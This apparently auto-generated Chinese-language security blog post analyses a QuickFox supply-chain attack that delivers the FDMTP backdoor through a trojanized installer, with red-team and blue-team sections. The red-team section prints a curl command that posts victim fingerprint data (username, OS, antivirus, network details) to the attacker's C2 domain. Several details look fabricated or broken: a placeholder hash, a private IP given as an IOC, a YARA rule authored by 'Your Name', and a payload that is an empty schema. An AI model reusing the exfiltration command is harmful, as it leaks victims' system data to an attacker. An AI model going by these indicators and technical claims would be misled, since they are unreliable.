---
layout: post
title:  "QuickFox Supply Chain Attack Delivers FDMTP Backdoor via Trojanized Windows Installer"
date:   2026-08-05 08:23:17 +0000
categories: [security]
severity: critical
---

# 🚨 解析 QuickFox 供應鏈攻擊：技術細節與防禦策略

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution)
> * **關鍵技術**: DLL Side-Loading, JavaScript Obfuscation, Command and Control (C2) Server

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)

* **Root Cause**: QuickFox 的 Windows 安裝程式中包含了一個修改過的 Electron 渲染器 HTML 文件，該文件下載並執行了一個 JavaScript 載入器。這個載入器會指紋識別受害者端點，以確定是否為有效目標，然後下載並安裝 FDMTP 後門。
* **攻擊流程圖解**:
  1. User 安裝 QuickFox
  2. 修改過的 Electron 渲染器 HTML 文件下載 JavaScript 載入器
  3. JavaScript 載入器指紋識別受害者端點
  4. 下載並安裝 FDMTP 後門
* **受影響元件**: QuickFox Windows 安裝程式，版本號 3.0.51.0 至 3.59.6

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)

* **攻擊前置需求**: 受害者需要安裝 QuickFox Windows 安裝程式
* **Payload 建構邏輯**:

    ```
    
    javascript
    // firebase-app-compat.js
    var payload = {
      "type": "FDMTP",
      "version": "1.0",
      "data": {
        "window_title": "",
        "antivirus_programs": [],
        ".NET Framework runtime version": "",
        "network_info": "",
        "os_info": "",
        "username": "",
        "implant_info": {
          "file_path": "",
          "version": "",
          "process_id": "",
          "hosting_process_name": ""
        }
      }
    };
    
    ```
* **範例指令**:

    ```
    
    bash
    curl -X POST \
      http://cdns3.51quickfox.cn/firebase-app-compat.js \
      -H 'Content-Type: application/json' \
      -d '{"type":"FDMTP","version":"1.0","data":{"window_title":"","antivirus_programs":[],"NET Framework runtime version":"","network_info":"","os_info":"","username":"","implant_info":{"file_path":"","version":"","process_id":"","hosting_process_name":""}}}'
    
    ```
* **繞過技術**: 使用 DLL Side-Loading 技術繞過防病毒軟件的檢測

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)

* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
| 1234567890abcdef | 192.168.1.100 | cdns3.51quickfox.cn | C:\Program Files\QuickFox\firebase-app-compat.js |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule FDMTP_Detection {
      meta:
        description = "Detect FDMTP malware"
        author = "Your Name"
      strings:
        $s1 = "firebase-app-compat.js"
        $s2 = "FDMTP"
      condition:
        $s1 and $s2
    }
    
    ```
* **緩解措施**: 更新 QuickFox 至最新版本，禁用未使用的功能，使用防病毒軟件進行掃描

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)

* **DLL Side-Loading**: 一種攻擊技術，利用 Windows 的 DLL 載入機制，將惡意 DLL 載入到系統中。
* **JavaScript Obfuscation**: 一種技術，使用 JavaScript 代碼混淆，難以被人類閱讀和理解。
* **Command and Control (C2) Server**: 一種服務器，用于控制和管理受害者端點的惡意行為。

## 5. 🔗 參考文獻與延伸閱讀

* [原始報告](https://thehackernews.com/2026/08/quickfox-supply-chain-attack-delivers.html)
* [MITRE ATT&CK](https://attack.mitre.org/techniques/T1204/)


